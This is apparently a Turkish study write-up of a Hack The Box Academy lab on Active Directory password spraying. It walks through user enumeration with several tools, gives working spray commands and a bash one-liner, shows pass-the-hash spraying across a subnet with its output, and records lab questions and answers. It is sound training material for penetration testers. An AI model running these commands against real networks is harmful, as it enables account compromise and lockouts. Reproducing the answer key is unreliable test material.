- Kilitleme süresi 30 dakikadır (bu süre kuruluşa bağlı olarak daha yüksek veya daha düşük olabilir), bu nedenle bir hesabı yanlışlıkla kilitlediğimizde (kaçının!!), 30 dakikalık süre geçtikten sonra kilidi açılacaktır

* Hesapların kilidi otomatik olarak açılır (bazı kuruluşlarda bir yöneticinin hesabın kilidini manuel olarak açması gerekir). Parola püskürtme işlemi gerçekleştirirken hesapları asla kilitlemek istemeyiz, ancak özellikle bir yöneticinin müdahale etmesi ve yüzlerce (veya binlerce) hesabın kilidini elle/komut dosyasıyla açması gereken bir kuruluşta hesapları kilitlemekten kaçınmak isteriz  
    
- Parola karmaşıklığı etkinleştirilmiştir, yani bir kullanıcı aşağıdakilerden 3/4'üne sahip bir parola seçmelidir: büyük harf, küçük harf, sayı, özel karakter (`Password1` veya `Welcome1` buradaki “karmaşıklık” gereksinimini karşılayacaktır, ancak yine de açıkça zayıf parolalardır).

Yeni bir domain oluşturulduğunda varsayılan parola politikası aşağıdaki gibidir ve bu politikayı hiç değiştirmeyen pek çok kuruluş olmuştur:
![Pasted image 20241018231450.png](/img/user/resimler/Pasted%20image%2020241018231450.png)

## **Sonraki Adımlar**  

Artık elimizde parola ilkesi olduğuna göre, parola püskürtme saldırımızı gerçekleştirmek için bir hedef kullanıcı listesi oluşturmamız gerekir. Dışarıdan parola püskürtme işlemi gerçekleştiriyorsak (veya şirket içi bir değerlendirme yapıyorsak ve burada gösterilen yöntemlerden herhangi birini kullanarak ilkeyi alamıyorsak) bazen parola ilkesini elde edemeyeceğimizi unutmayın. Bu durumlarda, hesapları kilitlememek için son derece dikkatli `olmalıyız`. Amaç mümkün olduğunca kapsamlı bir değerlendirme ise, müşterimizden her zaman parola politikasını isteyebiliriz. Politikayı istemek değerlendirmenin beklentilerine uymuyorsa veya müşteri bunu sağlamak istemiyorsa, bir, en fazla iki parola püskürtme denemesi yapmalı ( iç veya dış olmamızdan bağımsız olarak) ve gerçekten iki deneme yapmaya karar verirsek denemeler arasında bir saatten fazla beklemeliyiz. Çoğu kurumda kilitleme eşiği 5 hatalı parola denemesi, kilitleme süresi 30 dakika ve hesapların kilidi otomatik olarak açılacak olsa da, bunun her zaman normal olduğuna güvenemeyiz. Kilitleme eşiği 3 olan ve bir yöneticinin müdahale edip hesapların kilidini manuel olarak açmasını gerektiren çok sayıda kuruluş gördüm.

`Kuruluştaki her hesabı kilitleyen pentester olmak istemeyiz!`  

Şimdi hedef kullanıcıların bir listesini toplayarak parola püskürtme saldırılarımızı başlatmaya hazırlanalım.

Soru : Yeni bir domain oluşturulduğunda varsayılan Minimum şifre uzunluğu nedir? (Bir sayı)
Cevap :7

Soru : INLANEFREIGHT.LOCAL domaininde minPwdLength ne olarak ayarlanmıştır? (Bir sayı)
Cevap : 8


# **Password Spraying- Hedef Kullanıcı Listesi Oluşturma**

## **Detaylı Kullanıcı Numaralandırma**  

Başarılı bir password spraying saldırısı düzenlemek için öncelikle kimlik doğrulama girişiminde bulunacağımız geçerli domain kullanıcılarının bir listesine ihtiyacımız var. Geçerli kullanıcıların hedef listesini toplamanın birkaç yolu vardır:

- Domain controller'dan domain kullanıcılarının tam listesini almak için bir SMB NULL oturumundan yararlanarak  
    
- LDAP'ı anonim olarak sorgulamak ve domain kullanıcı listesini aşağı çekmek için bir LDAP anonim bind kullanmak

- Kullanıcıları doğrulamak için `Kerbrute` gibi bir araç kullanarak [istatistiksel olarak olası kullanıcı adları](https://github.com/insidetrust/statistically-likely-usernames) GitHub deposu gibi bir kaynaktan bir kelime listesi kullanarak veya potansiyel olarak geçerli kullanıcıların bir listesini oluşturmak için [linkedin2username](https://github.com/initstring/linkedin2username) gibi bir araç kullanarak toplandı

- Müşterimiz tarafından sağlanan veya `Responder` kullanılarak LLMNR/NBT-NS responder poising veya hatta daha küçük bir kelime listesi kullanılarak başarılı bir parola spreyi gibi başka bir yolla elde edilen bir Linux veya Windows saldırı sisteminden bir dizi kimlik bilgisi kullanarak

Hangi yöntemi seçersek seçelim, domain parola politikasını da göz önünde bulundurmamız hayati önem taşır. Bir SMB NULL oturumumuz, LDAP anonim bağlama veya bir dizi geçerli kimlik bilgimiz varsa, parola ilkesini numaralandırabiliriz. Bu politikanın elimizde olması çok faydalıdır çünkü minimum parola uzunluğu ve parola karmaşıklığının etkin olup olmadığı, püskürtme denemelerimizde deneyeceğimiz parolaların listesini formüle etmemize yardımcı olabilir. Hesap kilitleme eşiğini ve hatalı parola zamanlayıcısını bilmek, herhangi bir hesabı kilitlemeden bir seferde kaç püskürtme denemesi yapabileceğimizi ve püskürtme denemeleri arasında kaç dakika beklememiz gerektiğini bize söyleyecektir.

Yine, parola politikasını bilmiyorsak, müşterimize her zaman sorabiliriz ve bunu sağlamazlarsa, bir dayanak için diğer tüm seçenekler tükenmişse, “hail mary” olarak çok hedefli bir parola püskürtme girişimi deneyebiliriz. Herhangi bir hesabı kilitlememek için birkaç saatte bir püskürtmeyi de deneyebiliriz. Seçtiğimiz yöntem ne olursa olsun ve parola politikamız olsun ya da olmasın, aşağıdakiler dahil ancak bunlarla sınırlı olmamak üzere her zaman faaliyetlerimizin bir kaydını tutmalıyız:

- Hedef alınan hesaplar  
- Saldırıda kullanılan Domain Controller  
- Püskürtme zamanı  
- Püskürtme tarihi  
- Denenen parola(lar)

Bu, çabalarımızı tekrarlamadığımızdan emin olmamıza yardımcı olacaktır. Bir hesap kilitlenmesi meydana gelirse veya müşterimiz şüpheli oturum açma girişimleri fark ederse, günlük sistemleriyle çapraz kontrol yapmak ve ağda kötü bir şey olmadığından emin olmak için onlara notlarımızı sağlayabiliriz.


## **Kullanıcı Listesini Çekmek için SMB NULL Oturumu**

İç bir makinedeyseniz ancak geçerli domain kimlik bilgileriniz yoksa, Domain Controller'larda SMB NULL oturumlarını veya LDAP anonim bağlamalarını arayabilirsiniz. Bunların her ikisi de Active Directory ve parola ilkesi içindeki tüm kullanıcıların doğru bir listesini elde etmenizi sağlayacaktır. Bir Windows host üzerinde bir domain kullanıcısı veya `SYSTEM` erişimi için zaten kimlik bilgileriniz varsa, bu bilgiler için Active Directory'yi kolayca sorgulayabilirsiniz.

Bilgisayarı `taklit` edebildiği için bunu SYSTEM hesabını kullanarak yapmak mümkündür. Bir bilgisayar nesnesi, bir domain kullanıcı hesabı olarak değerlendirilir (“forest trusts” üzerinden kimlik doğrulama gibi bazı farklılıklarla birlikte). Geçerli bir domain hesabınız yoksa ve SMB NULL oturumları ve LDAP anonim bağlamaları mümkün değilse, e-posta toplama ve LinkedIn gibi harici kaynakları kullanarak bir kullanıcı listesi oluşturabilirsiniz. Bu kullanıcı listesi tam olmayacaktır, ancak Active Directory'ye erişim sağlamanız için yeterli olabilir.

SMB NULL oturumlarından ve LDAP anonim bağlantılarından yararlanabilen bazı araçlar arasında [enum4linux](“https://github.com/portcullislabs/enum4linux”), [rpcclient](“https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html”) ve [CrackMapExec](“https://github.com/byt3bl33d3r/CrackMapExec”) sayılabilir. Araç ne olursa olsun, çıktıyı temizlemek ve her satırda bir tane olmak üzere yalnızca kullanıcı adlarından oluşan bir liste elde etmek için biraz filtreleme yapmamız gerekecek. Bunu `enum4linux` ile `-U` bayrağı ile yapabiliriz.


#### Using enum4linux

```shell-session
M1R4CKCK@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>
```

`rpcclient` kullanarak anonim olarak bağlandıktan sonra `enumdomusers` komutunu kullanabiliriz.


#### Using rpcclient

```shell-session
M1R4CKCK@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>
```

Son olarak, `CrackMapExec` 'i `--users` bayrağı ile kullanabiliriz. Bu, `badpwdcount` 'u (geçersiz giriş denemeleri) da gösterecek kullanışlı bir araçtır, böylece kilitleme eşiğine yakın olan hesapları listemizden kaldırabiliriz. Ayrıca, son hatalı parola denemesinin tarih ve saati olan `baddpwdtime` değerini de gösterir, böylece bir hesabın `badpwdcount` değerinin sıfırlanmasına ne kadar yakın olduğunu görebiliriz. Birden fazla Domain Controller'ın bulunduğu bir ortamda, bu değer her birinde ayrı ayrı tutulur. Hesabın hatalı parola denemelerinin doğru bir toplamını elde etmek için, ya her bir Domain Controller'ı sorgulamamız ve değerlerin toplamını kullanmamız ya da Domain Controller'ı PDC Emulator FSMO rolü ile sorgulamamız gerekir.


#### Using CrackMapExec --users Flag
![Pasted image 20241018233409.png](/img/user/resimler/Pasted%20image%2020241018233409.png)


## **LDAP Anonim ile Kullanıcıları Toplama**
Bir LDAP anonim bind bulduğumuzda kullanıcıları toplamak için çeşitli araçlar kullanabiliriz. Bazı örnekler [windapsearch](https://github.com/ropnop/windapsearch) ve [ldapsearch](https://linux.die.net/man/1/ldapsearch)'ü içerir. Eğer `ldapsearch` kullanmayı seçersek, geçerli bir LDAP arama filtresi belirtmemiz gerekecektir. [Active Directory LDAP](“https://academy.hackthebox.com/course/preview/active-directory-ldap”) modülünde bu arama filtreleri hakkında daha fazla bilgi edinebiliriz.


#### Using ldapsearch

```shell-session
M1R4CKCK@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch

<SNIP>
```

`windapsearch` gibi araçlar bunu kolaylaştırır (yine de kendi LDAP arama filtrelerimizi nasıl oluşturacağımızı anlamalıyız). Burada, `-u` bayrağı ile boş bir kullanıcı adı sağlayarak anonim erişimi ve araca sadece kullanıcıları almasını söylemek için `-U` bayrağını belirtebiliriz `.`


#### Using windapsearch

```shell-session
M1R4CKCK@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users: 

cn: Guest

cn: Htb Student
userPrincipalName: htb-student@inlanefreight.local

cn: Annie Vazquez
userPrincipalName: avazquez@inlanefreight.local

cn: Paul Falcon
userPrincipalName: pfalcon@inlanefreight.local

cn: Fae Anthony
userPrincipalName: fanthony@inlanefreight.local

cn: Walter Dillard
userPrincipalName: wdillard@inlanefreight.local

<SNIP>
```


## **Kerbrute ile Kullanıcıları Numaralandırma**

`Domain'in İlk Numaralandırılması` bölümünde belirtildiği gibi, iç ağdaki konumumuzdan hiç erişimimiz yoksa, geçerli AD hesaplarını numaralandırmak ve parola püskürtmek için `Kerbrute` 'u kullanabiliriz.

Bu araç, parola püskürtme işlemini gerçekleştirmek için çok daha hızlı ve potansiyel olarak daha gizli bir yol olan [Kerberos Ön Kimlik Doğrulamasını](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication) kullanır. Bu yöntem Windows olay kimliği [4625'i](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) oluşturmaz [:](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) [Bir hesap oturum açamadı](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) veya genellikle izlenen[bir](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) oturum açma hatası. Araç, kullanıcı adı numaralandırması gerçekleştirmek için Kerberos Ön Kimlik Doğrulaması olmadan domain controller'a TGT istekleri gönderir. KDC `PRINCIPAL UNKNOWN` hatası ile yanıt verirse, kullanıcı adı geçersizdir. KDC Kerberos Ön Kimlik Doğrulaması istediğinde, bu kullanıcı adının var olduğunu gösterir ve araç bunu geçerli olarak işaretler. Bu kullanıcı adı numaralandırma yöntemi oturum açma hatalarına neden olmaz ve hesapları kilitlemez. Ancak, elimizde geçerli kullanıcıların bir listesi olduğunda ve bu aracı parola püskürtme için kullanmak üzere vites değiştirdiğimizde, başarısız Kerberos Ön Kimlik Doğrulama denemeleri bir hesabın başarısız oturum açma hesaplarına dahil edilir ve hesabın kilitlenmesine neden olabilir, bu nedenle seçilen yöntem ne olursa olsun yine de dikkatli olmalıyız.

Bu yöntemi, `flast` biçiminde 48[.](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt)705 olası yaygın kullanıcı adından oluşan [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) kelime listesini kullanarak deneyelim. [İstatistiksel olarak olası kullanıcı](“https://github.com/insidetrust/statistically-likely-usernames”) adları GitHub deposu, bu tür saldırılar için mükemmel bir kaynaktır ve `Kerbrute` kullanarak geçerli kullanıcı adlarını numaralandırmak için kullanabileceğimiz çeşitli farklı kullanıcı adı listeleri içerir.


#### Kerbrute User Enumeration

```shell-session
M1R4CKCK@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local

<SNIP>
```

Sadece 12 saniye içinde 48.000'den fazla kullanıcı adını kontrol ettik ve 50'den fazla geçerli kullanıcı adı keşfettik. Kullanıcı adı numaralandırma için Kerbrute kullanmak olay kimliği [4768](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)'i oluşturacaktır [:](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768) [Bir Kerberos kimlik doğrulama bileti (TGT) talep edildi](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). Bu yalnızca [Kerberos olay günlüğü](“https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging”) Group Policy aracılığıyla etkinleştirilirse tetiklenecektir. Savunmacılar SIEM araçlarını, bir saldırıya işaret edebilecek bu olay kimliğinin akışını arayacak şekilde ayarlayabilirler. Bir sızma testi sırasında bu yöntemle başarılı olursak, bu raporumuza eklemek için mükemmel bir öneri olabilir.  

Yukarıda vurgulanan yöntemlerden herhangi birini kullanarak geçerli bir kullanıcı adı listesi oluşturamazsak, tekrar harici bilgi toplamaya dönebilir ve şirket e-posta adreslerini arayabilir veya bir şirketin LinkedIn sayfasındaki olası kullanıcı adlarını karıştırmak için [linkedin2username](“https://github.com/initstring/linkedin2username”) gibi bir araç kullanabiliriz.


## **Kullanıcı Listemizi Oluşturmak için Kimlik Doğrulamalı Numaralandırma**
Geçerli kimlik bilgileriyle, bir kullanıcı listesi oluşturmak için daha önce belirtilen araçlardan herhangi birini kullanabiliriz. Hızlı ve kolay bir yol CrackMapExec kullanmaktır.


#### **CrackMapExec'i Geçerli Kimlik Bilgileri ile Kullanma**

```shell-session
M1R4CKCK@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

[sudo] password for htb-student: 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD! 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\pfalcon                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58

<SNIP>
```


## **Şimdi Eğlence Zamanı**  

Parola püskürtme için bir hedef kullanıcı listesi oluşturmayı ve parola ilkelerini ele aldığımıza göre, şimdi bir Linux saldırı hostundan ve ardından bir Windows hostundan birkaç şekilde parola püskürtme saldırıları gerçekleştirerek ellerimizi kirletelim.

Soru : ATTACK01 hostunda Kerbrute ve /opt/jsmith.txt adresinde bulunan kelime listesini kullanarak geçerli kullanıcı adlarını numaralandırın. Kimliği doğrulanmamış bir bakış açısından sadece bu kelime listesi ile kaç tane geçerli kullanıcı adı sayabiliriz? 

Cevap : 56

![Pasted image 20241018234815.png](/img/user/resimler/Pasted%20image%2020241018234815.png)


# **Internal (iç) Password Spraying - Linux'tan**,
Önceki bölümlerde özetlenen yöntemlerden birini kullanarak bir kelime listesi oluşturduğumuza göre, şimdi saldırımızı gerçekleştirme zamanı. İlerleyen bölümlerde Linux ve Windows hostlardan Parola Püskürtme pratiği yapacağız. Bu, erişim için domain kimlik bilgilerini elde etmenin iki ana yolundan biri olduğu için bizim için önemli bir odak noktasıdır, ancak aynı zamanda dikkatli bir şekilde ilerlememiz gereken bir yoldur.


## **Linux Host'tan Internal Password Spraying**
Önceki bölümde gösterilen yöntemlerden birini kullanarak bir kelime listesi oluşturduktan sonra, sıra saldırıyı gerçekleştirmeye gelir. `Rpcclient` bu saldırıyı Linux'tan gerçekleştirmek için mükemmel bir seçenektir. Önemli bir husus, geçerli bir oturum açma işleminin `rpcclient` ile hemen anlaşılmaması ve `Authority Name` yanıtının başarılı bir oturum açma işlemini göstermesidir. Geçersiz oturum açma girişimlerini yanıtta `Authority` için `grepping` yaparak filtreleyebiliriz. Aşağıdaki Bash one-liner ( [buradan](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/) uyarlanmıştır) saldırıyı gerçekleştirmek için kullanılabilir.

#### **Saldırı için bir Bash one-liner kullanmak**
```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Bunu hedef ortama karşı deneyelim.

```shell-session
M1R4CKCK@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

Daha önce tartışıldığı gibi aynı saldırı için `Kerbrute` 'u da kullanabiliriz.


#### Using Kerbrute for the Attack

```shell-session
M1R4CKCK@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

Linux'tan parola püskürtme işlemi gerçekleştirmek için başka birçok yöntem vardır. Bir başka harika seçenek de `CrackMapExec` kullanmaktır. Her zaman çok yönlü olan bu araç, bir püskürtme saldırısında tek bir parolaya karşı çalıştırılacak kullanıcı adlarından oluşan bir metin dosyasını kabul eder. Burada oturum açma hatalarını filtrelemek için `+` için grep yapıyoruz ve birçok çıktı satırı arasında gezinerek hiçbir şeyi kaçırmadığımızdan emin olmak için yalnızca geçerli oturum açma girişimlerine odaklanıyoruz.

#### **CrackMapExec Kullanma ve Oturum Açma Hatalarını Filtreleme**
```shell-session
M1R4CKCK@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

Parola püskürtme saldırımızla bir (veya daha fazla!) isabet elde ettikten sonra, kimlik bilgilerini bir Domain Controller'a karşı hızlı bir şekilde doğrulamak için `CrackMapExec` 'i kullanabiliriz.

#### **CrackMapExec ile Kimlik Bilgilerini Doğrulama**
```shell-session
M1R4CKCK@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

## **Lokal Administrator Parolasının Reuse (Yeniden Kullanımı)**
Internal password spraying sadece domain kullanıcı hesapları ile mümkün değildir. Admin erişimi ve lokal yönetici hesabı (veya başka bir ayrıcalıklı lokal hesap) için NTLM parola hash'i veya cleartext parolası elde ederseniz, bu ağdaki birden fazla hostta denenebilir. Lokal yönetici hesabı parolasının yeniden kullanımı, otomatik dağıtımlarda gold imajların kullanılması ve birden fazla hostta aynı parolanın zorlanmasıyla algılanan yönetim kolaylığı nedeniyle yaygındır.  

CrackMapExec bu saldırıyı denemek için kullanışlı bir araçtır. `SQL` ya da `Microsoft Exchange` sunucuları gibi yüksek değerli hostları hedef almakta fayda vardır çünkü bu hostlarda yüksek ayrıcalıklı bir kullanıcının oturum açmış olması ya da kimlik bilgilerinin bellekte kalıcı olması daha olasıdır.

Lokal administrator hesapları ile çalışırken, parolanın tekrar kullanımı veya hesaplar arasında ortak parola biçimleri göz önünde bulundurulmalıdır. Lokal administrator hesabı parolası `$desktop%@admin123` gibi benzersiz bir şekilde ayarlanmış bir masaüstü host bulursak, sunuculara karşı `$server%@admin123` denemeye değer olabilir. Ayrıca, `bsmith` gibi standart olmayan lokal yönetici hesapları bulursak, parolanın benzer şekilde adlandırılmış bir domain kullanıcı hesabı için yeniden kullanıldığını görebiliriz. Aynı prensip domain hesapları için de geçerli olabilir. `ajones` adlı bir kullanıcının parolasını alırsak, parolalarını tekrar kullanıp kullanmadıklarını görmek için aynı parolayı yönetici hesabında (kullanıcının bir hesabı varsa), örneğin `ajones_adm`, denemeye değer. Bu, domain güven durumlarında da yaygındır. A domainindeki bir kullanıcı için B domainindeki aynı veya benzer kullanıcı adına sahip bir kullanıcı için geçerli kimlik bilgileri elde edebiliriz veya bunun tersi de geçerlidir.

Bazen yerel SAM veritabanından yalnızca lokal administrator hesabı için NTLM hash'ini alabiliriz. Bu durumlarda, aynı parola kümesine sahip lokal administrator hesaplarını aramak için NT hash'ini bütün bir subnet'e (veya birden fazla subnet'e) püskürtebiliriz. Aşağıdaki örnekte, başka bir makineden alınan built-in local administrator account NT hash kullanarak /23 ağındaki tüm host'lara kimlik doğrulaması yapmaya çalışıyoruz. `--local-auth` bayrağı, araca her makinede yalnızca bir kez oturum açmayı denemesini söyleyerek hesap kilitlenmesi riskini ortadan kaldırır. `Domain için built-in administrator'ı potansiyel olarak kilitlememek için bu bayrağın ayarlandığından emin olun`. Varsayılan olarak, yerel auth seçeneği ayarlanmadığında, araç geçerli domain'i kullanarak kimlik doğrulaması yapmaya çalışacaktır ve bu da hesap kilitlenmelerine neden olabilir.

#### **CrackMapExec ile Lokal Admin Püskürtme**
```shell-session
M1R4CKCK@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

Yukarıdaki çıktı, kimlik bilgilerinin `172.16.5.0/23` subnet'indeki `3` sistemde local admin olarak geçerli olduğunu göstermektedir. Daha sonra erişimimize yardımcı olacak herhangi bir şey bulup bulamayacağımızı görmek için her sistemi numaralandırmaya geçebiliriz.  

Bu teknik etkili olmakla birlikte oldukça gürültülüdür ve gizlilik gerektiren değerlendirmeler için iyi bir seçim değildir. Domain'i tehlikeye atma yolumuzun bir parçası olmasa bile, yaygın bir sorun olduğundan ve müşterilerimiz için vurgulanması gerektiğinden, sızma testleri sırasında bu sorunu aramaya her zaman değer. Bu sorunu gidermenin bir yolu, ücretsiz Microsoft aracı [Local Administrator Password Solution (LAPS)](“https://www.microsoft.com/en-us/download/details.aspx?id=46899”) kullanarak Active Directory'nin [local administrator](“https://www.microsoft.com/en-us/download/details.aspx?id=46899”) parolalarını yönetmesini sağlamak ve her hostta belirli aralıklarla değişen benzersiz bir parola uygulamaktır.


Soru : Welcome1 parolasına sahip “s” harfi ile başlayan kullanıcı hesabını bulun. Kullanıcı adını cevabınız olarak gönderin.
Cevap : 

![Pasted image 20241019003908.png](/img/user/resimler/Pasted%20image%2020241019003908.png)

önce AD kullanıcılarını arıyalım . 

![Pasted image 20241019004055.png](/img/user/resimler/Pasted%20image%2020241019004055.png)

 
Parola püskürtmeyi deneyelim

![Pasted image 20241019004232.png](/img/user/resimler/Pasted%20image%2020241019004232.png)


kullanıcıları txt dosyasına kayıt edelim . 

![Pasted image 20241019004525.png](/img/user/resimler/Pasted%20image%2020241019004525.png)
![Pasted image 20241019004534.png](/img/user/resimler/Pasted%20image%2020241019004534.png)

2.Benim çözüm 
![Pasted image 20241019005020.png](/img/user/resimler/Pasted%20image%2020241019005020.png)
 --continue--on-success devam eder .


# Internal Password Spraying - from Windows
[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) aracı, domain'e bağlı bir Windows host'unda oldukça etkilidir. Domain'de kimliğimiz doğrulanırsa, araç otomatik olarak Active Directory'den bir kullanıcı listesi oluşturacak, domain parola politikasını sorgulayacak ve bir kilitleme girişimi içinde kullanıcı hesaplarını hariç tutacaktır. Püskürtme saldırısını Linux hostumuzdan çalıştırdığımız gibi, bir Windows host üzerindeysek ancak domain kimliğimiz yoksa da araca bir kullanıcı listesi sağlayabiliriz. Müşterinin, ağlarında araçları yükleyebileceğimiz yönetilen bir Windows cihazından test yapmamızı istediği bir durumla karşılaşabiliriz. Fiziksel olarak ofislerinde olabiliriz ve bir Windows sanal makinesinden test yapmak isteyebiliriz veya başka bir saldırı yoluyla ilk dayanak noktasını kazanabilir, domain'deki bir host'ta kimlik doğrulaması yapabilir ve domain'de daha fazla hakka sahip bir hesabın kimlik bilgilerini elde etmek için parola püskürtme işlemi gerçekleştirebiliriz.

Araç ile kullanabileceğimiz birkaç seçenek vardır. Host domain-joined olduğu için `-UserList` bayrağını atlayacağız ve aracın bizim için bir liste oluşturmasına izin vereceğiz `.` `Password` bayrağını ve tek bir parola sağlayacağız ve daha sonra kullanmak üzere çıktımızı bir dosyaya yazmak için `-OutFile` bayrağını kullanacağız.


#### Using DomainPasswordSpray.ps1
```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
